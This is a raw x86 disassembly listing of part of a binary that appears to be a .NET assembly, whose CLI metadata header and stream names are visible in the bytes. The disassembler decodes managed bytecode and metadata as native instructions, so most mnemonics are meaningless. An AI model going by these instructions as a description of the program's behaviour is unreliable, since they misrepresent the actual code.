10005682:	03 00                	add    (%eax),%eax
10005684:	8a 00                	mov    (%eax),%al
10005686:	00 00                	add    %al,(%eax)
10005688:	00 00                	add    %al,(%eax)
1000568a:	00 00                	add    %al,(%eax)
1000568c:	17                   	pop    %ss
1000568d:	fe                   	(bad)
1000568e:	13 80 11 00 00 04    	adc    0x4000011(%eax),%eax
10005694:	16                   	push   %ss
10005695:	fe                   	(bad)
10005696:	13 80 10 00 00 04    	adc    0x4000010(%eax),%eax
1000569c:	7e 0e                	jle    0x100056ac
1000569e:	00 00                	add    %al,(%eax)
100056a0:	04 2c                	add    $0x2c,%al
100056a2:	4a                   	dec    %edx
100056a3:	7e 0e                	jle    0x100056b3
100056a5:	00 00                	add    %al,(%eax)
100056a7:	04 6f                	add    $0x6f,%al
100056a9:	7a 00                	jp     0x100056ab
100056ab:	00 0a                	add    %cl,(%edx)
100056ad:	2c 2a                	sub    $0x2a,%al
100056af:	7e 0e                	jle    0x100056bf
100056b1:	00 00                	add    %al,(%eax)
100056b3:	04 7e                	add    $0x7e,%al
100056b5:	16                   	push   %ss
100056b6:	00 00                	add    %al,(%eax)
100056b8:	04 2d                	add    $0x2d,%al
100056ba:	11 14 fe             	adc    %edx,(%esi,%edi,8)
100056bd:	06                   	push   %es
100056be:	3e 00 00             	add    %al,%ds:(%eax)
100056c1:	06                   	push   %es
100056c2:	73 7b                	jae    0x1000573f
100056c4:	00 00                	add    %al,(%eax)
100056c6:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
100056cc:	7e 16                	jle    0x100056e4
100056ce:	00 00                	add    %al,(%eax)
100056d0:	04 6f                	add    $0x6f,%al
100056d2:	7c 00                	jl     0x100056d4
100056d4:	00 0a                	add    %cl,(%edx)
100056d6:	26 2b 0f             	sub    %es:(%edi),%ecx
100056d9:	28 78 00             	sub    %bh,0x0(%eax)
100056dc:	00 0a                	add    %cl,(%edx)
100056de:	7e 0e                	jle    0x100056ee
100056e0:	00 00                	add    %al,(%eax)
100056e2:	04 6f                	add    $0x6f,%al
100056e4:	79 00                	jns    0x100056e6
100056e6:	00 0a                	add    %cl,(%edx)
100056e8:	de 03                	fiadds (%ebx)
100056ea:	26 de 00             	fiadds %es:(%eax)
100056ed:	7e 0f                	jle    0x100056fe
100056ef:	00 00                	add    %al,(%eax)
100056f1:	04 2c                	add    $0x2c,%al
100056f3:	15 7e 0f 00 00       	adc    $0xf7e,%eax
100056f8:	04 20                	add    $0x20,%al
100056fa:	e8 03 00 00 6f       	call   0x7f005702
100056ff:	13 00                	adc    (%eax),%eax
10005701:	00 0a                	add    %cl,(%edx)
10005703:	26 de 03             	fiadds %es:(%ebx)
10005706:	26 de 00             	fiadds %es:(%eax)
10005709:	14 80                	adc    $0x80,%al
1000570b:	0e                   	push   %cs
1000570c:	00 00                	add    %al,(%eax)
1000570e:	04 14                	add    $0x14,%al
10005710:	80 0f 00             	orb    $0x0,(%edi)
10005713:	00 04 2a             	add    %al,(%edx,%ebp,1)
10005716:	00 00                	add    %al,(%eax)
10005718:	01 1c 00             	add    %ebx,(%eax,%eax,1)
1000571b:	00 00                	add    %al,(%eax)
1000571d:	00 17                	add    %dl,(%edi)
1000571f:	00 47 5e             	add    %al,0x5e(%edi)
10005722:	00 03                	add    %al,(%ebx)
10005724:	01 00                	add    %eax,(%eax)
10005726:	00 01                	add    %al,(%ecx)
10005728:	00 00                	add    %al,(%eax)
1000572a:	68 00 12 7a 00       	push   $0x7a1200
1000572f:	03 01                	add    (%ecx),%eax
10005731:	00 00                	add    %al,(%eax)
10005733:	01 ba 15 73 7d 00    	add    %edi,0x7d7315(%edx)
10005739:	00 0a                	add    %cl,(%edx)
1000573b:	80 0d 00 00 04 14 80 	orb    $0x80,0x14040000
10005742:	0e                   	push   %cs
10005743:	00 00                	add    %al,(%eax)
10005745:	04 14                	add    $0x14,%al
10005747:	80 0f 00             	orb    $0x0,(%edi)
1000574a:	00 04 16             	add    %al,(%esi,%edx,1)
1000574d:	fe                   	(bad)
1000574e:	13 80 10 00 00 04    	adc    0x4000010(%eax),%eax
10005754:	16                   	push   %ss
10005755:	fe                   	(bad)
10005756:	13 80 11 00 00 04    	adc    0x4000011(%eax),%eax
1000575c:	17                   	pop    %ss
1000575d:	80 12 00             	adcb   $0x0,(%edx)
10005760:	00 04 2a             	add    %al,(%edx,%ebp,1)
10005763:	1e                   	push   %ds
10005764:	02 28                	add    (%eax),%ch
10005766:	05 00 00 0a 2a       	add    $0x2a0a0000,%eax
1000576b:	00 42 53             	add    %al,0x53(%edx)
1000576e:	4a                   	dec    %edx
1000576f:	42                   	inc    %edx
10005770:	01 00                	add    %eax,(%eax)
10005772:	01 00                	add    %eax,(%eax)
10005774:	00 00                	add    %al,(%eax)
10005776:	00 00                	add    %al,(%eax)
10005778:	0c 00                	or     $0x0,%al
1000577a:	00 00                	add    %al,(%eax)
1000577c:	76 34                	jbe    0x100057b2
1000577e:	2e 30 2e             	xor    %ch,%cs:(%esi)
10005781:	33 30                	xor    (%eax),%esi
10005783:	33 31                	xor    (%ecx),%esi
10005785:	39 00                	cmp    %eax,(%eax)
10005787:	00 00                	add    %al,(%eax)
10005789:	00 05 00 6c 00 00    	add    %al,0x6c00
1000578f:	00 f8                	add    %bh,%al
10005791:	0e                   	push   %cs
10005792:	00 00                	add    %al,(%eax)
10005794:	23 7e 00             	and    0x0(%esi),%edi
10005797:	00 64 0f 00          	add    %ah,0x0(%edi,%ecx,1)
1000579b:	00 24 0f             	add    %ah,(%edi,%ecx,1)
1000579e:	00 00                	add    %al,(%eax)
100057a0:	23 53 74             	and    0x74(%ebx),%edx
100057a3:	72 69                	jb     0x1000580e
100057a5:	6e                   	outsb  %ds:(%esi),(%dx)
100057a6:	67 73 00             	addr16 jae 0x100057a9
100057a9:	00 00                	add    %al,(%eax)
100057ab:	00 88 1e 00 00 68    	add    %cl,0x6800001e(%eax)
100057b1:	11 00                	adc    %eax,(%eax)
100057b3:	00 23                	add    %ah,(%ebx)
100057b5:	55                   	push   %ebp
100057b6:	53                   	push   %ebx
100057b7:	00 f0                	add    %dh,%al
100057b9:	2f                   	das
100057ba:	00 00                	add    %al,(%eax)
100057bc:	10 00                	adc    %al,(%eax)
100057be:	00 00                	add    %al,(%eax)
100057c0:	23 47 55             	and    0x55(%edi),%eax
100057c3:	49                   	dec    %ecx
100057c4:	44                   	inc    %esp
100057c5:	00 00                	add    %al,(%eax)
100057c7:	00 00                	add    %al,(%eax)
100057c9:	30 00                	xor    %al,(%eax)
100057cb:	00 6c 04 00          	add    %ch,0x0(%esp,%eax,1)
100057cf:	00 23                	add    %ah,(%ebx)
100057d1:	42                   	inc    %edx
100057d2:	6c                   	insb   (%dx),%es:(%edi)
100057d3:	6f                   	outsl  %ds:(%esi),(%dx)
100057d4:	62 00                	bound  %eax,(%eax)
100057d6:	00 00                	add    %al,(%eax)
100057d8:	00 00                	add    %al,(%eax)
100057da:	00 00                	add    %al,(%eax)
100057dc:	02 00                	add    (%eax),%al
100057de:	00 01                	add    %al,(%ecx)
100057e0:	57                   	push   %edi
100057e1:	9d                   	popf
100057e2:	a2 3d 09 02 00       	mov    %al,0x2093d
100057e7:	00 00                	add    %al,(%eax)
100057e9:	fa                   	cli
100057ea:	25 33 00 16 00       	and    $0x160033,%eax
100057ef:	00 01                	add    %al,(%ecx)
100057f1:	00 00                	add    %al,(%eax)
100057f3:	00 42 00             	add    %al,0x0(%edx)
100057f6:	00 00                	add    %al,(%eax)
100057f8:	0a 00                	or     (%eax),%al
100057fa:	00 00                	add    %al,(%eax)
100057fc:	39 00                	cmp    %eax,(%eax)
100057fe:	00 00                	add    %al,(%eax)
10005800:	48                   	dec    %eax
10005801:	00 00                	add    %al,(%eax)
10005803:	00 5d 00             	add    %bl,0x0(%ebp)
10005806:	00 00                	add    %al,(%eax)
10005808:	7d 00                	jge    0x1000580a
1000580a:	00 00                	add    %al,(%eax)
1000580c:	05 00 00 00 0d       	add    $0xd000000,%eax
10005811:	00 00                	add    %al,(%eax)
10005813:	00 01                	add    %al,(%ecx)
10005815:	00 00                	add    %al,(%eax)
10005817:	00 0f                	add    %cl,(%edi)
10005819:	00 00                	add    %al,(%eax)
1000581b:	00 01                	add    %al,(%ecx)
1000581d:	00 00                	add    %al,(%eax)
1000581f:	00 01                	add    %al,(%ecx)
10005821:	00 00                	add    %al,(%eax)
10005823:	00 01                	add    %al,(%ecx)
10005825:	00 00                	add    %al,(%eax)
10005827:	00 03                	add    %al,(%ebx)
10005829:	00 00                	add    %al,(%eax)
1000582b:	00 02                	add    %al,(%edx)
1000582d:	00 00                	add    %al,(%eax)
1000582f:	00 1c 00             	add    %bl,(%eax,%eax,1)
10005832:	00 00                	add    %al,(%eax)
10005834:	01 00                	add    %eax,(%eax)
10005836:	00 00                	add    %al,(%eax)
10005838:	01 00                	add    %eax,(%eax)
1000583a:	00 00                	add    %al,(%eax)
1000583c:	04 00                	add    $0x0,%al
1000583e:	00 00                	add    %al,(%eax)
10005840:	03 00                	add    (%eax),%eax
10005842:	00 00                	add    %al,(%eax)
10005844:	00 00                	add    %al,(%eax)
10005846:	0a 00                	or     (%eax),%al
10005848:	01 00                	add    %eax,(%eax)
1000584a:	00 00                	add    %al,(%eax)
1000584c:	00 00                	add    %al,(%eax)
1000584e:	06                   	push   %es
1000584f:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
10005853:	00 0a                	add    %cl,(%edx)
10005855:	00 7c 01 6d          	add    %bh,0x6d(%ecx,%eax,1)
10005859:	01 06                	add    %eax,(%esi)
1000585b:	00 ac 01 a0 01 0e 00 	add    %ch,0xe01a0(%ecx,%eax,1)
10005862:	57                   	push   %edi
10005863:	02 3c 02             	add    (%edx,%eax,1),%bh
10005866:	06                   	push   %es
10005867:	00 82 02 71 02 06    	add    %al,0x6027102(%edx)
1000586d:	00 b4 02 94 02 12 00 	add    %dh,0x120294(%edx,%eax,1)
10005874:	fb                   	sti
10005875:	03 e6                	add    %esi,%esp
10005877:	03 06                	add    (%esi),%eax
10005879:	00 03                	add    %al,(%ebx)
1000587b:	05 e4 04 06 00       	add    $0x604e4,%eax
10005880:	80 05 94 02 06 00 a0 	addb   $0xa0,0x60294
10005887:	05 94 02 06 00       	add    $0x60294,%eax
1000588c:	c7 05 e4 04 06 00 f6 	movl   $0x6505f6,0x604e4
10005893:	05 65 00 
10005896:	0a 00                	or     (%eax),%al
10005898:	02 06                	add    (%esi),%al
1000589a:	6d                   	insl   (%dx),%es:(%edi)
1000589b:	01 0e                	add    %ecx,(%esi)
1000589d:	00 49 06             	add    %cl,0x6(%ecx)
100058a0:	36 06                	ss push %es
100058a2:	06                   	push   %es
100058a3:	00 70 06             	add    %dh,0x6(%eax)
100058a6:	71 02                	jno    0x100058aa
100058a8:	06                   	push   %es
100058a9:	00 8d 06 71 02 06    	add    %cl,0x6027106(%ebp)
100058af:	00 ae 06 65 00 06    	add    %ch,0x6006506(%esi)
100058b5:	00 c3                	add    %al,%bl
100058b7:	06                   	push   %es
100058b8:	71 02                	jno    0x100058bc
100058ba:	06                   	push   %es
100058bb:	00 f6                	add    %dh,%dh
100058bd:	06                   	push   %es
100058be:	65 00 06             	add    %al,%gs:(%esi)
100058c1:	00 11                	add    %dl,(%ecx)
100058c3:	07                   	pop    %es
100058c4:	65 00 06             	add    %al,%gs:(%esi)
100058c7:	00 19                	add    %bl,(%ecx)
100058c9:	07                   	pop    %es
100058ca:	65 00 06             	add    %al,%gs:(%esi)
100058cd:	00 64 07 94          	add    %ah,-0x6c(%edi,%eax,1)
100058d1:	02 06                	add    (%esi),%al
100058d3:	00 7f 07             	add    %bh,0x7(%edi)
100058d6:	65 00 06             	add    %al,%gs:(%esi)
100058d9:	00 bb 07 94 02 06    	add    %bh,0x6029407(%ebx)
100058df:	00 ca                	add    %cl,%dl
100058e1:	07                   	pop    %es
100058e2:	65 00 06             	add    %al,%gs:(%esi)
100058e5:	00 d0                	add    %dl,%al
100058e7:	07                   	pop    %es
100058e8:	65 00 12             	add    %dl,%gs:(%edx)
100058eb:	00 13                	add    %dl,(%ebx)
100058ed:	08 e6                	or     %ah,%dh
100058ef:	03 12                	add    (%edx),%edx
100058f1:	00 23                	add    %ah,(%ebx)
100058f3:	08 e6                	or     %ah,%dh
100058f5:	03 12                	add    (%edx),%edx
100058f7:	00 6c 08 e6          	add    %ch,-0x1a(%eax,%ecx,1)
100058fb:	03 06                	add    (%esi),%eax
100058fd:	00 91 08 65 00 0a    	add    %dl,0xa006508(%ecx)
10005903:	00 dd                	add    %bl,%ch
10005905:	08 6d 01             	or     %ch,0x1(%ebp)
10005908:	12 00                	adc    (%eax),%al
1000590a:	ec                   	in     (%dx),%al
1000590b:	09 e6                	or     %esp,%esi
1000590d:	03 12                	add    (%edx),%edx
1000590f:	00 0c 0a             	add    %cl,(%edx,%ecx,1)
10005912:	e6 03                	out    %al,$0x3
10005914:	06                   	push   %es
10005915:	00 59 0a             	add    %bl,0xa(%ecx)
10005918:	65 00 0a             	add    %cl,%gs:(%edx)
1000591b:	00 8d 0a 6d 01 0a    	add    %cl,0xa016d0a(%ebp)
10005921:	00 bc 0a a3 0a 12 00 	add    %bh,0x120aa3(%edx,%ecx,1)
10005928:	dc 0a                	fmull  (%edx)
1000592a:	e6 03                	out    %al,$0x3
1000592c:	06                   	push   %es
1000592d:	00 f9                	add    %bh,%cl
1000592f:	0a 65 00             	or     0x0(%ebp),%ah
10005932:	0a 00                	or     (%eax),%al
10005934:	0f 0b                	ud2
10005936:	6d                   	insl   (%dx),%es:(%edi)
10005937:	01 0a                	add    %ecx,(%edx)
10005939:	00 1a                	add    %bl,(%edx)
1000593b:	0b 6d 01             	or     0x1(%ebp),%ebp
1000593e:	06                   	push   %es
1000593f:	00 2c 0b             	add    %ch,(%ebx,%ecx,1)
10005942:	65 00 0a             	add    %cl,%gs:(%edx)
10005945:	00 40 0b             	add    %al,0xb(%eax)
10005948:	6d                   	insl   (%dx),%es:(%edi)
10005949:	01 0a                	add    %ecx,(%edx)
1000594b:	00 50 0b             	add    %dl,0xb(%eax)
1000594e:	a3 0a 06 00 e5       	mov    %eax,0xe500060a
10005953:	0b 65 00             	or     0x0(%ebp),%esp
10005956:	12 00                	adc    (%eax),%al
10005958:	05 0c e6 03 0a       	add    $0xa03e60c,%eax
1000595d:	00 1e                	add    %bl,(%esi)
1000595f:	0c 6d                	or     $0x6d,%al
10005961:	01 12                	add    %edx,(%edx)
10005963:	00 33                	add    %dh,(%ebx)
10005965:	0c e6                	or     $0xe6,%al
10005967:	03 0e                	add    (%esi),%ecx
10005969:	00 8a 0c 74 0c 12    	add    %cl,0x120c740c(%edx)
1000596f:	00 a5 0c e6 03 12    	add    %ah,0x1203e60c(%ebp)
10005975:	00 c9                	add    %cl,%cl
10005977:	0c e6                	or     $0xe6,%al
10005979:	03 0a                	add    (%edx),%ecx
1000597b:	00 ed                	add    %ch,%ch
1000597d:	0c 6d                	or     $0x6d,%al
1000597f:	01 0a                	add    %ecx,(%edx)
10005981:	00 00                	add    %al,(%eax)
10005983:	0d 6d 01 12 00       	or     $0x12016d,%eax
10005988:	30 0d e6 03 97 00    	xor    %cl,0x9703e6
1000598e:	4c                   	dec    %esp
1000598f:	0d 00 00 0a 00       	or     $0xa0000,%eax
10005994:	79 0d                	jns    0x100059a3
10005996:	6d                   	insl   (%dx),%es:(%edi)
10005997:	01 0a                	add    %ecx,(%edx)
10005999:	00 9e 0d 6d 01 0a    	add    %bl,0xa016d0d(%esi)
1000599f:	00 a8 0d 6d 01 06    	add    %ch,0x6016d0d(%eax)
100059a5:	00 c7                	add    %al,%bh
100059a7:	0d 65 00 12 00       	or     $0x120065,%eax
100059ac:	f0 0d e6 03 06 00    	lock or $0x603e6,%eax
100059b2:	0c 0e                	or     $0xe,%al
100059b4:	65 00 12             	add    %dl,%gs:(%edx)
100059b7:	00 2a                	add    %ch,(%edx)
100059b9:	0e                   	push   %cs
100059ba:	e6 03                	out    %al,$0x3
100059bc:	12 00                	adc    (%eax),%al
100059be:	69 0e e6 03 06 00    	imul   $0x603e6,(%esi),%ecx
100059c4:	79 0e                	jns    0x100059d4
100059c6:	71 02                	jno    0x100059ca
100059c8:	12 00                	adc    (%eax),%al
100059ca:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
100059cb:	0e                   	push   %cs
100059cc:	e6 03                	out    %al,$0x3
100059ce:	06                   	push   %es
100059cf:	00 00                	add    %al,(%eax)
100059d1:	0f 65 00             	pcmpgtw (%eax),%mm0
100059d4:	06                   	push   %es
100059d5:	00 0d 0f 65 00 00    	add    %cl,0x650f
100059db:	00 00                	add    %al,(%eax)
100059dd:	00 01                	add    %al,(%ecx)
100059df:	00 00                	add    %al,(%eax)
100059e1:	00 00                	add    %al,(%eax)
100059e3:	00 01                	add    %al,(%ecx)
100059e5:	00 01                	add    %al,(%ecx)
100059e7:	00 01                	add    %al,(%ecx)
100059e9:	00 10                	add    %dl,(%eax)
100059eb:	00 17                	add    %dl,(%edi)
100059ed:	00 00                	add    %al,(%eax)
100059ef:	00 05 00 01 00 01    	add    %al,0x1000100
100059f5:	00 01                	add    %al,(%ecx)
100059f7:	00 10                	add    %dl,(%eax)
100059f9:	00 23                	add    %ah,(%ebx)
100059fb:	00 00                	add    %al,(%eax)
100059fd:	00 05 00 02 00 0f    	add    %al,0xf000200
10005a03:	00 01                	add    %al,(%ecx)
10005a05:	00 10                	add    %dl,(%eax)
10005a07:	00 32                	add    %dh,(%edx)
10005a09:	00 00                	add    %al,(%eax)
10005a0b:	00 05 00 04 00 19    	add    %al,0x19000400
10005a11:	00 01                	add    %al,(%ecx)
10005a13:	00 10                	add    %dl,(%eax)
10005a15:	00 40 00             	add    %al,0x0(%eax)
10005a18:	00 00                	add    %al,(%eax)
10005a1a:	05 00 04 00 20       	add    $0x20000400,%eax
10005a1f:	00 01                	add    %al,(%ecx)
10005a21:	00 10                	add    %dl,(%eax)
10005a23:	00 4d 00             	add    %cl,0x0(%ebp)
10005a26:	00 00                	add    %al,(%eax)
10005a28:	05 00 0a 00 2b       	add    $0x2b000a00,%eax
10005a2d:	00 00                	add    %al,(%eax)
10005a2f:	00 00                	add    %al,(%eax)
10005a31:	00 1f                	add    %bl,(%edi)
10005a33:	07                   	pop    %es
10005a34:	00 00                	add    %al,(%eax)
10005a36:	05 00 17 00 40       	add    $0x40001700,%eax
10005a3b:	00 13                	add    %dl,(%ebx)
10005a3d:	01 00                	add    %eax,(%eax)
10005a3f:	00 89 07 00 00 5d    	add    %cl,0x5d000007(%ecx)
10005a45:	00 18                	add    %bl,(%eax)
10005a47:	00 40 00             	add    %al,0x0(%eax)
10005a4a:	03 01                	add    (%ecx),%eax
10005a4c:	10 00                	adc    %al,(%eax)
10005a4e:	00 08                	add    %cl,(%eax)
10005a50:	00 00                	add    %al,(%eax)
10005a52:	05 00 18 00 40       	add    $0x40001800,%eax
10005a57:	00 03                	add    %al,(%ebx)
10005a59:	01 10                	add    %edx,(%eax)
10005a5b:	00 b8 08 00 00 05    	add    %bh,0x5000008(%eax)
10005a61:	00 20                	add    %ah,(%eax)
10005a63:	00 45 00             	add    %al,0x0(%ebp)
10005a66:	11 00                	adc    %eax,(%eax)
10005a68:	a3 00 26 00 51       	mov    %eax,0x51002600
10005a6d:	80 f6 00             	xor    $0x0,%dh
10005a70:	41                   	inc    %ecx
10005a71:	00 51 80             	add    %dl,-0x80(%ecx)
10005a74:	fe 00                	incb   (%eax)
10005a76:	41                   	inc    %ecx
10005a77:	00 11                	add    %dl,(%ecx)
10005a79:	00 32                	add    %dh,(%edx)
10005a7b:	02 a9 00 11 00 5f    	add    0x5f001100(%ecx),%ch
10005a81:	02 ad 00 11 00 66    	add    0x66001100(%ebp),%ch
10005a87:	02 b4 00 11 00 89 02 	add    0x2890011(%eax,%eax,1),%dh
10005a8e:	b7 00                	mov    $0x0,%bh
10005a90:	11 00                	adc    %eax,(%eax)
10005a92:	bf 02 bb 00 31       	mov    $0x3100bb02,%edi
10005a97:	00 c9                	add    %cl,%cl
10005a99:	02 c0                	add    %al,%al
10005a9b:	00 51 80             	add    %dl,-0x80(%ecx)
10005a9e:	1f                   	pop    %ds
10005a9f:	03 41 00             	add    0x0(%ecx),%eax
10005aa2:	51                   	push   %ecx
10005aa3:	80 2b 03             	subb   $0x3,(%ebx)
10005aa6:	41                   	inc    %ecx
10005aa7:	00 51 80             	add    %dl,-0x80(%ecx)
10005aaa:	3c 03                	cmp    $0x3,%al
10005aac:	41                   	inc    %ecx
10005aad:	00 31                	add    %dh,(%ecx)
10005aaf:	00 d9                	add    %bl,%cl
10005ab1:	03 11                	add    (%ecx),%edx
10005ab3:	01 11                	add    %edx,(%ecx)
10005ab5:	00 00                	add    %al,(%eax)
10005ab7:	04 14                	add    $0x14,%al
10005ab9:	01 11                	add    %edx,(%ecx)
10005abb:	00 0c 04             	add    %cl,(%esp,%eax,1)
10005abe:	b7 00                	mov    $0x0,%bh
10005ac0:	11 00                	adc    %eax,(%eax)
10005ac2:	17                   	pop    %ss
10005ac3:	04 bb                	add    $0xbb,%al
10005ac5:	00 11                	add    %dl,(%ecx)
10005ac7:	00 20                	add    %ah,(%eax)
10005ac9:	04 bb                	add    $0xbb,%al
10005acb:	00 11                	add    %dl,(%ecx)
10005acd:	00 2c 04             	add    %ch,(%esp,%eax,1)
10005ad0:	41                   	inc    %ecx
10005ad1:	00 11                	add    %dl,(%ecx)
10005ad3:	00 c5                	add    %al,%ch
10005ad5:	09 20                	or     %esp,(%eax)
10005ad7:	02 11                	add    (%ecx),%dl
10005ad9:	00 24 0a             	add    %ah,(%edx,%ecx,1)
10005adc:	2c 02                	sub    $0x2,%al
10005ade:	11 00                	adc    %eax,(%eax)
10005ae0:	66 0a 38             	data16 or (%eax),%bh
10005ae3:	02 11                	add    (%ecx),%dl
10005ae5:	00 b4 0e 32 04 13 01 	add    %dh,0x1130432(%esi,%ecx,1)
10005aec:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
10005aed:	07                   	pop    %es
10005aee:	e0 01                	loopne 0x10005af1
10005af0:	06                   	push   %es
10005af1:	00 19                	add    %bl,(%ecx)
10005af3:	08 ec                	or     %ch,%ah
10005af5:	01 06                	add    %eax,(%esi)
10005af7:	00 29                	add    %ch,(%ecx)
10005af9:	08 f0                	or     %dh,%al
10005afb:	01 06                	add    %eax,(%esi)
10005afd:	00 31                	add    %dh,(%ecx)
10005aff:	08 f0                	or     %dh,%al
10005b01:	01 06                	add    %eax,(%esi)
10005b03:	00 3c 08             	add    %bh,(%eax,%ecx,1)
10005b06:	f0 01 06             	lock add %eax,(%esi)
10005b09:	00 43 08             	add    %al,0x8(%ebx)
10005b0c:	41                   	inc    %ecx
10005b0d:	00 06                	add    %al,(%esi)
10005b0f:	00 4c 08 f4          	add    %cl,-0xc(%eax,%ecx,1)
10005b13:	01 06                	add    %eax,(%esi)
10005b15:	00 52 08             	add    %dl,0x8(%edx)
10005b18:	41                   	inc    %ecx
10005b19:	00 06                	add    %al,(%esi)
10005b1b:	00 5c 08 41          	add    %bl,0x41(%eax,%ecx,1)
10005b1f:	00 06                	add    %al,(%esi)
10005b21:	00 cc                	add    %cl,%ah
10005b23:	08 05 02 06 00 e3    	or     %al,0xe3000602
10005b29:	08 09                	or     %cl,(%ecx)
10005b2b:	02 06                	add    (%esi),%al
10005b2d:	00 ec                	add    %ch,%ah
10005b2f:	08 09                	or     %cl,(%ecx)
10005b31:	02 06                	add    (%esi),%al
10005b33:	00 f9                	add    %bh,%cl
10005b35:	08 41 00             	or     %al,0x0(%ecx)
10005b38:	06                   	push   %es
10005b39:	00 fe                	add    %bh,%dh
10005b3b:	08 ec                	or     %ch,%ah
10005b3d:	01 06                	add    %eax,(%esi)
10005b3f:	00 07                	add    %al,(%edi)
10005b41:	09 f0                	or     %esi,%eax
10005b43:	01 06                	add    %eax,(%esi)
10005b45:	00 0f                	add    %cl,(%edi)
10005b47:	09 0d 02 06 00 15    	or     %ecx,0x15000602
10005b4d:	09 41 00             	or     %eax,0x0(%ecx)
10005b50:	06                   	push   %es
10005b51:	00 1d 09 41 00 06    	add    %bl,0x6004109
10005b57:	00 23                	add    %ah,(%ebx)
10005b59:	09 41 00             	or     %eax,0x0(%ecx)
10005b5c:	06                   	push   %es
10005b5d:	00 29                	add    %ch,(%ecx)
10005b5f:	09 09                	or     %ecx,(%ecx)
10005b61:	02 06                	add    (%esi),%al
10005b63:	00 33                	add    %dh,(%ebx)
10005b65:	09 11                	or     %edx,(%ecx)
10005b67:	02 06                	add    (%esi),%al
10005b69:	00 39                	add    %bh,(%ecx)
10005b6b:	09 11                	or     %edx,(%ecx)
10005b6d:	02 06                	add    (%esi),%al
10005b6f:	00 40 09             	add    %al,0x9(%eax)
10005b72:	11 02                	adc    %eax,(%edx)
10005b74:	06                   	push   %es
10005b75:	00 48 09             	add    %cl,0x9(%eax)
10005b78:	16                   	push   %ss
10005b79:	02 06                	add    (%esi),%al
10005b7b:	00 50 09             	add    %dl,0x9(%eax)
10005b7e:	16                   	push   %ss
10005b7f:	02 06                	add    (%esi),%al
10005b81:	00 56 09             	add    %dl,0x9(%esi)
10005b84:	11 02                	adc    %eax,(%edx)
10005b86:	06                   	push   %es
10005b87:	00 5c 09 1b          	add    %bl,0x1b(%ecx,%ecx,1)
10005b8b:	02 06                	add    (%esi),%al
10005b8d:	00 65 09             	add    %ah,0x9(%ebp)
10005b90:	ec                   	in     (%dx),%al
10005b91:	01 06                	add    %eax,(%esi)
10005b93:	00 6a 09             	add    %ch,0x9(%edx)
10005b96:	ec                   	in     (%dx),%al
10005b97:	01 06                	add    %eax,(%esi)
10005b99:	00 71 09             	add    %dh,0x9(%ecx)
10005b9c:	f0 01 06             	lock add %eax,(%esi)
10005b9f:	00 77 09             	add    %dh,0x9(%edi)
10005ba2:	f0 01 06             	lock add %eax,(%esi)
10005ba5:	00 7f 09             	add    %bh,0x9(%edi)
10005ba8:	c0 00 06             	rolb   $0x6,(%eax)
10005bab:	00 85 09 41 00 06    	add    %al,0x6004109(%ebp)
10005bb1:	00 8b 09 41 00 06    	add    %cl,0x6004109(%ebx)
10005bb7:	00 91 09 0d 02 00    	add    %dl,0x20d09(%ecx)
10005bbd:	00 00                	add    %al,(%eax)
10005bbf:	00 80 00 96 20 73    	add    %al,0x73209600(%eax)
10005bc5:	00 0a                	add    %cl,(%edx)
10005bc7:	00 01                	add    %al,(%ecx)
10005bc9:	00 00                	add    %al,(%eax)
10005bcb:	00 00                	add    %al,(%eax)
10005bcd:	00 80 00 96 20 80    	add    %al,-0x7fdf6a00(%eax)
10005bd3:	00 10                	add    %dl,(%eax)
10005bd5:	00 03                	add    %al,(%ebx)
10005bd7:	00 00                	add    %al,(%eax)
10005bd9:	00 00                	add    %al,(%eax)
10005bdb:	00 80 00 96 20 8c    	add    %al,-0x73df6a00(%eax)
10005be1:	00 19                	add    %bl,(%ecx)
10005be3:	00 08                	add    %cl,(%eax)
10005be5:	00 00                	add    %al,(%eax)
10005be7:	00 00                	add    %al,(%eax)
10005be9:	00 80 00 96 20 98    	add    %al,-0x67df6a00(%eax)
10005bef:	00 21                	add    %ah,(%ecx)
10005bf1:	00 0c 00             	add    %cl,(%eax,%eax,1)
10005bf4:	50                   	push   %eax
10005bf5:	20 00                	and    %al,(%eax)
10005bf7:	00 00                	add    %al,(%eax)
10005bf9:	00 96 00 ad 00 29    	add    %dl,0x2900ad00(%esi)
10005bff:	00 0d 00 78 20 00    	add    %cl,0x207800
10005c05:	00 00                	add    %al,(%eax)
10005c07:	00 96 00 b7 00 2f    	add    %dl,0x2f00b700(%esi)
10005c0d:	00 0f                	add    %cl,(%edi)
10005c0f:	00 cc                	add    %cl,%ah
10005c11:	20 00                	and    %al,(%eax)
10005c13:	00 00                	add    %al,(%eax)
10005c15:	00 96 00 c1 00 2f    	add    %dl,0x2f00c100(%esi)
10005c1b:	00 10                	add    %dl,(%eax)
10005c1d:	00 21                	add    %ah,(%ecx)
10005c1f:	21 00                	and    %eax,(%eax)
10005c21:	00 00                	add    %al,(%eax)
10005c23:	00 96 00 c9 00 2f    	add    %dl,0x2f00c900(%esi)
10005c29:	00 11                	add    %dl,(%ecx)
10005c2b:	00 55 21             	add    %dl,0x21(%ebp)
10005c2e:	00 00                	add    %al,(%eax)
10005c30:	00 00                	add    %al,(%eax)
10005c32:	96                   	xchg   %eax,%esi
10005c33:	00 d4                	add    %dl,%ah
10005c35:	00 34 00             	add    %dh,(%eax,%eax,1)
10005c38:	12 00                	adc    (%eax),%al
10005c3a:	7f 21                	jg     0x10005c5d
10005c3c:	00 00                	add    %al,(%eax)
10005c3e:	00 00                	add    %al,(%eax)
10005c40:	96                   	xchg   %eax,%esi
10005c41:	00 dc                	add    %bl,%ah
10005c43:	00 34 00             	add    %dh,(%eax,%eax,1)
10005c46:	13 00                	adc    (%eax),%eax
10005c48:	a9 21 00 00 00       	test   $0x21,%eax
10005c4d:	00 96 00 e2 00 39    	add    %dl,0x3900e200(%esi)
10005c53:	00 14 00             	add    %dl,(%eax,%eax,1)
10005c56:	b8 21 00 00 00       	mov    $0x21,%eax
10005c5b:	00 96 00 e8 00 39    	add    %dl,0x3900e800(%esi)
10005c61:	00 14 00             	add    %dl,(%eax,%eax,1)
10005c64:	c9                   	leave
10005c65:	21 00                	and    %eax,(%eax)
10005c67:	00 00                	add    %al,(%eax)
10005c69:	00 86 18 f0 00 3d    	add    %al,0x3d00f018(%esi)
10005c6f:	00 14 00             	add    %dl,(%eax,%eax,1)
10005c72:	c7                   	(bad)
10005c73:	21 00                	and    %eax,(%eax)
10005c75:	00 00                	add    %al,(%eax)
